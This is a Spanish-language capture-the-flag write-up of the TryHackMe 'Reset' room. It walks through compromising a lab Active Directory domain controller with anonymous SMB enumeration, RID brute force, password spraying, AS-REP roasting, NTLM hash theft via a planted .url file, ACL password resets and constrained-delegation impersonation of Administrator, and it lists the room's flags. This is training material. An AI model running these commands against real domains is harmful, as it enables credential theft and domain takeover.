# TryHackMe — Reset (Restablecer)

**Sala:** Reset (`tryhackme.com/room/resetui`)
**Plataforma:** TryHackMe
**Dificultad:** **Hard** (~50 min, reto de Active Directory)
**Tema:** Enumeración SMB anónima · `kerbrute` / `--rid-brute` · Password spray · AS-REP Roast · Cadena de ACLs con BloodHound · **Constrained delegation** (S4U2)
**Objetivo:** Task 1 — *Find all the flags!* → `user.txt` (automate) y `root.txt` (Administrator).

> **Resumen en una línea:** un DC (`HAYSTACK`, `thm.corp`) con **SMB anónimo** deja leer el share `Data/onboarding`, donde una carta de bienvenida filtra la contraseña por defecto `ResetMe123!`; con `--rid-brute` se saca la lista de usuarios y se hace spray; el resto de la sala es subir por la cadena de ACLs (**AS-REP Roast → reseteos de contraseña → constrained delegation**) hasta impersonar al Administrador.

---

## 0. Información de la máquina

**Una sola VM** (las salas de usuario solo admiten una): es el **Domain Controller**.

| Dato | Valor |
| --- | --- |
| Hostname | `HAYSTACK` (`HayStack.thm.corp`) |
| Dominio | `thm.corp` (NetBIOS `THM`) |
| SO | Windows Server 2019 Build 17763 (`10.0.17763`) |
| IP (sesión 1) | `10.65.146.13` (nmap) |
| IP (sesión 2) | `10.64.182.107` (enum SMB/kerbrute) |
| IP (sesión 3) | `10.64.135.149` (rid-brute / spray) |

> ⚠️ **La IP cambia cada vez que THM reinicia la máquina** (límite de tiempo de la VM). Anota siempre usuarios/credenciales entre sesiones para retomar donde lo dejaste.

Añadir a `/etc/hosts`:

```
<IP> HayStack.thm.corp thm.corp
```

---

## 1. Reconocimiento (Nmap)

```bash
nmap -sV -sC IP_MACHINA
```

![[Pasted image 20261119090111.png]]

Puertos clave del DC: **53** (DNS), **88** (Kerberos), **135/139** (RPC/NetBIOS), **389/636/3268/3269** (LDAP/LDAPS/GC), **445** (SMB), **464** (kpasswd), **3389** (RDP).

![[Pasted image 20261119090133.png]]

El script de RDP entrega el dominio sin autenticar (`rdp-ntlm-info`):

```
Target_Name: THM
NetBIOS_Domain_Name: THM
NetBIOS_Computer_Name: HAYSTACK
DNS_Domain_Name: thm.corp
DNS_Computer_Name: HayStack.thm.corp
Product_Version: 10.0.17763
```

- `ssl-cert: commonName=HayStack.thm.corp` → SAN para el `/etc/hosts`.
- `smb2-security-mode: 311 → Message signing enabled and required` (no se puede forzar NTLM relay tan fácil).

---

## 2. SMB anónimo y enumeración de usuarios

Comprobar si acepta login sin credenciales (aquí sí: `Null Auth:True`):

```bash
nxc smb IP_MACHINA
```

![[Pasted image 20261119101341.png]]

```
[*] Windows 10 / Server 2019 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:None) (Null Auth:True)
```

### 2.1 `kerbrute` — ¿qué usuarios existen?

```bash
kerbrute userenum --dc IP_MACHINA -d thm.corp /home/kali/SecLists/Usernames/xato-net-10-million-usernames.txt
```

![[Pasted image 20261119101403.png]]

```
[+] VALID USERNAME: guest@thm.corp
[+] VALID USERNAME: administrator@thm.corp
[+] VALID USERNAME: haystack@thm.corp
```

- La primera pasada con la wordlist grande dio `Tested 1000 usernames (0 valid)` — probar con varias listas de SecLists.
- `guest` y `administrator` válidos → probar siempre el acceso anónimo.

### 2.2 Shares accesibles sin contraseña

```bash
smbclient -L //IP_MACHINA -N
```

![[Pasted image 20261119102227.png]]

```
ADMIN$   Remote Admin
C$       Default share
Data     <-- el interesante
IPC$     Remote IPC
NETLOGON Logon server share
SYSVOL   Logon server share
```

---

## 3. `Data/onboarding` — la contraseña por defecto

```bash
smbclient //IP_MACHINA/Data -N
```

![[Pasted image 20261119102332.png]]

```
smb: \> ls
onboarding
```

Dentro de `onboarding` hay ficheros con **nombres aleatorios que cambian** (3 PDFs y 1 `.txt` de 521 bytes). El `.txt` es una carta de bienvenida:

![[Pasted image 20261119104118.png]]

```
Subject: Welcome to Reset — Dear <USER>, Welcome aboard!
...
The initial password is: ResetMe123!
Best regards,
The Reset Team
```

**Contraseña por defecto de la organización → `ResetMe123!`**

- Truco: si los nombres cambian, baja todo de golpe:
  ```
  smb: \onboarding\> mask ""
  smb: \onboarding\> prompt OFF
  smb: \onboarding\> mget *
  ```

---

## 4. Primer spray — `haystack`

```bash
nxc smb IP_MACHINA -u 'haystack' -p 'ResetMe123!'
```

![[Pasted image 20261119104541.png]]

```
[+] thm.corp\haystack:ResetMe123! (Guest)
```

> ⚠️ **Ojo con `(Guest)`:** nxc marca `[+]` cuando la sesión baja a **invitado** (el servidor permite null session), no necesariamente porque la contraseña sea correcta. Un resultado solo es fiable si **no** lleva `(Guest)` (o sale `Pwn3d!`). Ver §7.

---

## 5. AS-REP Roast — del error al hash

### 5.1 Intento fallido: lista equivocada

```bash
impacket-GetNPUsers thm.corp/ -dc-ip IP_MACHINA -usersfile /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![[Pasted image 20261119161646.png]]

```
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
... (repetido para cada "usuario")
```

**Qué falló:** `-usersfile` espera una **lista de usuarios**, no una wordlist de directorios web. Con nombres como `images/` el KDC responde *client not found*.

### 5.2 Segundo intento, ahora con `clean_users.txt` ✅

Con la lista de usuarios ya montada (§6) se relanza el mismo comando:

```bash
impacket-GetNPUsers thm.corp/ -dc-ip IP_MACHINA -usersfile clean_users.txt -no-pass
```

![[Pasted image 20261120214558.png]]

Salida: los usuarios **con** `UF_DONT_REQUIRE_PREAUTH` devuelven su hash listo para crackear; los que no, se descartan:

![[Pasted image 20261120215535.png]]

```
[-] User SHAWNA_BRAY doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$ERNESTO_SILVA@THM.CORP:...
```

![[Pasted image 20261120215650.png]]

```
$krb5asrep$23$TABATHA_BRITT@THM.CORP:...:marlboro(1985)   <-- ya crackeado (john --show)
$krb5asrep$23$LEANN_LONG@THM.CORP:...
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
john --show asrep_hashes.txt
```

**Resultado:** 3 hashes (`ERNESTO_SILVA`, `TABATHA_BRITT`, `LEANN_LONG`) → **`TABATHA_BRITT` = `marlboro(1985)`** ✅ *(captura propia, 20/11)*.

> Los `KDC_ERR_C_PRINCIPAL_UNKNOWN` que siguen apareciendo son los **nombres truncados** por el `awk` de §6 que arrastró `clean_users.txt` — los usuarios roastables reales se distinguen porque devuelven hash.

---

## 6. `--rid-brute` — la lista de usuarios gratis

`anonymous` tiene acceso de lectura a `IPC$`, lo que permite enumerar SIDs:

```bash
nxc smb IP_MACHINA -u 'anonymous' -p '' --rid-brute
```

![[Pasted image 20261119162120.png]]

![[Pasted image 20261119164300.png]]

```
498: THM\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: THM\Administrator (SidTypeUser)
501: THM\Guest (SidTypeUser)
502: THM\krbtgt (SidTypeUser)
512: THM\Domain Admins (SidTypeGroup)
518: THM\Schema Admins (SidTypeGroup)
519: THM\Enterprise Admins (SidTypeGroup)
...
1108: THM\HAYSTACKS (SidTypeUser)
1111: THM\3091731410SA (SidTypeUser)
```

La salida sigue con decenas de usuarios reales:

![[Pasted image 20261119164322.png]]

![[Pasted image 20261119164344.png]]

```
1112: THM\ERNESTO_SILVA   1113: THM\TRACY_CARVER   1114: THM\SHAWNA_BRAY
1131: THM\TABATHA_BRITT   1135: THM\LILY_ONEILL    1142: THM\CRUZ_HALL
1144: THM\DARLA_WINTERS   1149: THM\LEANN_LONG    1156: THM\AUTOMATE
...
```

Guardado en fichero:

![[Pasted image 20261119164410.png]]

```bash
nxc smb IP_MACHINA -u 'anonymous' -p '' --rid-brute > rid_brutr.txt
cat rid_brutr.txt | awk '{print $6}' > rid_users.txt
cat rid_users.txt
```

> ⚠️ **Fallo de parsing:** `awk '{print $6}'` **corta los nombres con espacios** — `THM\Domain Admins` se queda en `THM\Domain`, `THM\Schema Admins` en `THM\Schema`… Por eso el spray de §7 llena de nombres raros (`Domain`, `Schema`, `Group`, `Read-only`…). Forma correcta (solo usuarios, sin cortar):
> ```bash
> grep SidTypeUser rid_brutr.txt | cut -d '\' -f 2 | cut -d ' ' -f 1 > rid_users.txt
> ```

---

## 7. Password spray con `ResetMe123!`

```bash
nxc smb IP_MACHINA -u clean_users.txt -p 'ResetMe123!' --continue-on-success
```

![[Pasted image 20261119165214.png]]

```
[+] thm.corp\Windows: ResetMe123! (Guest)
[+] thm.corp\anonymous: ResetMe123! (Guest)
[-] thm.corp\Administrator: ResetMe123! STATUS_ACCOUNT_RESTRICTION
[-] thm.corp\Guest: ResetMe123! STATUS_LOGON_FAILURE
[-] thm.corp\krbtgt: ResetMe123! STATUS_LOGON_FAILURE
[+] thm.corp\Domain: ResetMe123! (Guest)      <-- truncado de "Domain Admins"
[+] thm.corp\Schema: ResetMe123! (Guest)      <-- truncado de "Schema Admins"
...
```

![[Pasted image 20261119165238.png]]

- **Todos los `[+]` llevan `(Guest)`** → son falsos positivos (nombres truncados del awk + null session), **ninguno** es una cuenta real autenticada.
- Los usuarios reales devuelven `[-] STATUS_LOGON_FAILURE` / `STATUS_ACCOUNT_RESTRICTION`.

> **Lección:** en un spray con nxc, lee siempre el resultado completo: `[+] ... (Guest)` ≠ cuenta comprometida. Busca `[+]` **sin `(Guest)`** o `Pwn3d!`.

Re-ejecución el 20/11 con el mismo resultado (mismo `clean_users.txt`):

![[Pasted image 20261120214106.png]]

---

## 8. Validación de credenciales por SMB y GPP en SYSVOL

Con la contraseña crakeada en §5 se validan las credenciales contra SMB. El **primer intento falla por un typo** en la contraseña (`marlboro(1985))`) → `STATUS_LOGON_FAILURE`; repetido limpio → `[+]` y shares enumerados (`Data` con `READ,WRITE`):

![[Pasted image 20261120220953.png]]

```bash
nxc smb IP_MACHINA -u 'TABATHA_BRITT' -p 'marlboro(1985)' --shares
```

> ⚠️ **Lección:** un `STATUS_LOGON_FAILURE` tras un spray de una sola cuenta casi siempre es **typo**, no contraseña mala. Repite la credencial a mano antes de descartarla.

A continuación, búsqueda de contraseñas GPP en SYSVOL (el clásico `cpassword` en XML):

```bash
nxc smb IP_MACHINA -u 'TABATHA_BRITT' -p 'marlboro(1985)' -M gpp_password
```

![[Pasted image 20261120221804.png]]

- `[+] Found SYSVOL share` → `[+] Searching for potential XML files containing passwords`.
- **Pendiente:** la captura queda en la búsqueda; sin `cpassword` visible, la vía sigue siendo la cadena de ACLs (§9).

---

## 9. Pendiente: la cadena hasta las dos flags

Las capturas llegan hasta la validación de `TABATHA_BRITT` (§8). Según los writeups públicos, el tramo que falta tiene **dos caminos** hasta las flags:

**Camino A — forzar autenticación (NTLM theft):**
1. Los nombres de `onboarding` cambian = **hay alguien navegando el share**.
2. `python3 ntlm_theft.py -g url -s TU_IP -f test` → subir el `.url` a `onboarding` + `sudo responder -I tun0` → hash NTLMv2 de `AUTOMATE`.
3. `john --wordlist=rockyou.txt hash` → `evil-winrm -i haystack.thm.corp -u automate -p ...` → `C:\Users\automate\Desktop\user.txt`.

**Camino B — AS-REP Roast + cadena de ACLs (por aquí vas):**
1. ✅ **Hecho (§5):** `GetNPUsers` con la lista corregida → hashes de `ERNESTO_SILVA`, `TABATHA_BRITT`, `LEANN_LONG` → `john` → **`TABATHA_BRITT` = `marlboro(1985)`**.
2. ✅ **Hecho (§8):** credenciales validadas por SMB (`[+]` + shares) y GPP explorado en SYSVOL.
3. Pendiente — BloodHound: `TABATHA_BRITT` →`GenericAll`→ `SHAWNA_BRAY` →`ForceChangePassword`→ `CRUZ_HALL` →`GenericWrite`→ `DARLA_WINTERS` (resetear contraseñas con `net rpc password`).
4. `DARLA_WINTERS` tiene **constrained delegation** sobre `cifs/haystack.thm.corp`:
   ```bash
   getST.py -spn "cifs/haystack.thm.corp" -impersonate "Administrator" "thm.corp/DARLA_WINTERS:<pass>"
   export KRB5CCNAME=Administrator.ccache
   wmiexec.py -k -no-pass Administrator@haystack.thm.corp
   type C:\Users\Administrator\Desktop\root.txt
   ```

> ⚠️ **Pendiente de completar con capturas propias.** Ruta descrita de writeups públicos (jaxafed, Rich); verifica los pasos y las flags en tu instancia. Ojo: para Kerberos, **sincroniza la hora** con el DC (`htpdate`/`chrony`).

---

## 10. Flags

| Flag | Valor | Estado |
| --- | --- | --- |
| Contraseña inicial (onboarding) | `ResetMe123!` | ✅ captura propia |
| Creds AS-REP (`TABATHA_BRITT`) | `marlboro(1985)` | ✅ captura propia |
| User flag (`user.txt`, automate) | `THM{AUTOMATION_WILL_REPLACE_US}` | ⚠️ writeup — verificar |
| Root flag (`root.txt`, Administrator) | `THM{RE_RE_RE_SET_AND_DELEGATE}` | ⚠️ writeup — verificar |

---

## 11. Lecciones

1. **`--rid-brute` con anonymous = lista de usuarios sin coste** — el paso previo obligatorio para cualquier spray o AS-REP.
2. **`-usersfile` de GetNPUsers quiere usuarios**, no wordlists de directorios: si ves `KDC_ERR_C_PRINCIPAL_UNKNOWN` en masa, revisa la lista.
3. **`awk '{print $6}'` rompe los nombres con espacios** → falsos usuarios (`Domain`, `Schema`…) y resultados basura. Usa `grep SidTypeUser | cut`.
4. **`[+] ... (Guest)` con nxc no es una credencial válida** — es la sesión de invitada del null session.
5. **Un `STATUS_LOGON_FAILURE` de una sola cuenta suele ser typo**, no contraseña mala (§8).
6. **Un share con ficheros que cambian de nombre = actividad humana** → `ntlm_theft` + `responder` para capturar hashes (ojo, es el camino corto a `automate`).
7. **La cadena completa del dominio:** contraseña por defecto → spray → AS-REP → reset de contraseñas por ACLs → **constrained delegation** → Administrator. Cada eslabón por sí solo no es grave; juntos, dominio caído.
8. **THM reinicia la VM y cambia la IP**: lleva un fichero con IPs, usuarios y contraseñas entre sesiones.

> Comandos relacionados: `Comando Rapido/Nmap.md`, `Comando Rapido/SMB y Active Directory.md`, `Comando Rapido/Fuerza bruta y crackeo.md`.